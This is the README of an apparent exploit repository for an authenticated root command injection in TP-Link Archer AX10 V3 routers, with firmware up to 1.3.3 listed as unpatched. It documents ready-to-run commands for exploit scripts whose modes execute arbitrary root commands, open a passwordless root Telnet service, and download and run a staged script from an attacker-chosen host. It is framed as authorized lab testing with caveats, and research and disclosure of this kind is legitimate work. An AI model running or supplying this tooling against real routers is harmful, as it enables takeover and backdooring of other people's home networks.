# tp-root

**Authenticated root command injection on TP-Link Archer AX10 V3 (AX1500-class router).**

The DNS-over-HTTPS server verification path in the router's management backend passes an unsanitized value to a shell command. With an authenticated management session, this allows commands to execute with root privileges.

**Requirements:** access to the router's management interface from the LAN and the router administrator password. This is not an unauthenticated exploit. WAN-side reachability has not been established.

## Affected / rootable devices

| Device | Hardware revision | Firmware (`soft_ver`) | Root access | Evidence |
| --- | --- | --- | --- | --- |
| TP-Link Archer AX10 (AX1500 class) | V3 / `product_ver:3.0.0` | **1.3.2 Build 20251125 rel.69127** | **Confirmed** | Laboratory test before upgrade |
| TP-Link Archer AX10 (AX1500 class) | V3 / `product_ver:3.0.0` | **1.3.3 Build 20260616 rel.46516** | **Confirmed** | Laboratory retest, 2 October 2026; root UID verified |
| TP-Link Archer AX1500 | V3 (listed in AX10 V3 firmware support list) | Not independently established | **Unverified** | Firmware support-list entry only |

Only the **Archer AX10 V3** has been independently tested. A shared firmware support-list entry is not proof that a separately marketed AX1500 unit is rootable.

See [AFFECTED_DEVICES.md](AFFECTED_DEVICES.md) for evidence boundaries and version details.

## Technical evidence

The [AX10 V3 retest report](docs/AX10_V3_retest_1.3.3_redacted.pdf) records authenticated command execution as root on `1.3.3 Build 20260616 rel.46516`, including `uid=0(root) gid=0(root)`. The previous `1.3.2 Build 20251125 rel.69127` result is recorded for comparison.

The `AX10v3_1.10.2_...` string identifies the **web UI bundle**, not the firmware version. The firmware version is given by `soft_ver`. No fixed firmware version has been independently confirmed by these tests.

## Usage

### Requirements

- Python 3 and network access to the **LAN management interface** of a router you are authorized to test.
- Its **administrator password**.
- Python dependency: `pycryptodome>=3.18`.

From the repository root:

```bash
python3 -m venv .venv
source .venv/bin/activate
python3 -m pip install -r exploit/requirements.txt
```

### Primary CLI

Inspect the supported options without connecting to the router:

```bash
python3 exploit/ax1500_doh_rce.py --help
```

For an authorized lab router, use the **timing check**:

```bash
read -r -s -p "Router admin password: " TP_ADMIN_PASSWORD
echo
python3 exploit/ax1500_doh_rce.py 192.168.0.1 "$TP_ADMIN_PASSWORD" --check
unset TP_ADMIN_PASSWORD
```

Replace `192.168.0.1` with your router's LAN management IP. The first positional argument is the router address (without `http://`); the second is the web administrator password.

The `--check` mode **actively sends a command** that introduces an approximately five-second delay. It is not a passive probe or a guarantee of vulnerability status: network/server latency can affect the timing result.

The primary script also defines the following CLI modes:

| Option | Script behavior |
| --- | --- |
| `--check` | Delay-based check using the authenticated management interface |
| `--cmd` | Executes an operator-supplied command with the router backend's privileges |
| `--shell` | Starts a **passwordless root Telnet service** on the router; the optional port defaults to `2323` |

The last two options are intrusive. Do not use them on operational networks without an explicit test plan, and do not leave a passwordless shell accessible.

### Automated script (`ax1500_doh_rce_auto.py`)

The automatic script has **two different launch modes**.

**1. Explicit CLI mode (timing check only)**

Run from the repository root. This mode accepts positional arguments and does **not** run the automatic stager/Telnet sequence:

```bash
read -r -s -p "Router admin password: " TP_ADMIN_PASSWORD
echo
python3 exploit/ax1500_doh_rce_auto.py 192.168.0.1 "$TP_ADMIN_PASSWORD" --check
unset TP_ADMIN_PASSWORD
```

Replace `192.168.0.1` with the LAN IP of the router you are authorized to test. `--check` sends an active timing-based command and can misclassify slow responses. Inspect the full CLI syntax with `python3 exploit/ax1500_doh_rce_auto.py --help`.

**2. No-argument automation mode (intrusive; isolated lab only)**

Unlike `--check`, launching the script **without arguments starts a passwordless root Telnet service** after a successful check. `RUN_STAGER=0` only disables the downloaded-script execution step; `AUTO_OPEN_TELNET=0` only disables opening the local Telnet client. Neither disables the Telnet service on the router.

The following example suppresses payload retrieval and automatic client launch; it **still starts the Telnet service** and therefore must not be used on a production router:

```bash
export IP_ADDR=192.168.0.1
export HOST_IP=192.0.2.10  # Placeholder; still required when RUN_STAGER=0
export RUN_STAGER=0
export AUTO_OPEN_TELNET=0

read -r -s -p "Router admin password: " PASSWORD
echo
export PASSWORD

python3 exploit/ax1500_doh_rce_auto.py

unset PASSWORD IP_ADDR HOST_IP RUN_STAGER AUTO_OPEN_TELNET
```

`192.0.2.10` is a documentation-only placeholder. The script reads configuration from the **environment**, not from a `.env` file. The default no-argument behavior is more invasive than the example above: `RUN_STAGER=1` downloads and executes a script from `http://HOST_IP/STAGER_PATH` (default path `/x`), then starts Telnet and tries to open the local client. It does **not** host or create the staged file. Review and control any staged script in your isolated lab, and disable the resulting root Telnet service when testing is complete.

No-argument mode uses these environment variables:

| Variable | Purpose | Default |
| --- | --- | --- |
| `IP_ADDR` | Router LAN address | Required |
| `PASSWORD` | Router administrator password | Required |
| `HOST_IP` | Host used for payload retrieval | Required |
| `TELNET_PORT` | Passwordless Telnet service port | `2323` |
| `STAGER_PATH` | URL path of the staged content | `/x` |
| `RUN_STAGER` | Whether the script downloads and executes staged content | `1` (enabled) |
| `AUTO_OPEN_TELNET` | Whether it opens the local Telnet client | `1` (enabled) |
| `CHECK_SECONDS` | Requested timing delay | `5` |

**Important:** No-argument mode is not a check-only mode. After its check succeeds, it may download and execute a remote script and **starts a passwordless root Telnet service**, even when `RUN_STAGER=0`. It is unsuitable for routine verification and should only be evaluated in an isolated, authorized lab. At present, missing `IP_ADDR` or `HOST_IP` causes an exception rather than a user-friendly validation error.

### Session helper

`tools/tplink_session.py` is an importable Python helper, **not** a standalone command-line program. It requires the `TP_ROUTER_URL` environment variable to contain the full management URL, including `http://` or `https://` as appropriate. Other scripts in this repository do not automatically import this helper.

## Repository contents

- `exploit/ax1500_doh_rce.py` — authenticated proof of concept and timing-based check.
- `exploit/ax1500_doh_rce_auto.py` — optional automated proof of concept.
- `exploit/requirements.txt` — Python dependency specification.
- `tools/tplink_session.py` — authenticated router management-session helper.
- `docs/AX10_V3_retest_1.3.3_redacted.pdf` — laboratory retest evidence.
- `SECURITY.md` — testing scope and reporting guidance.
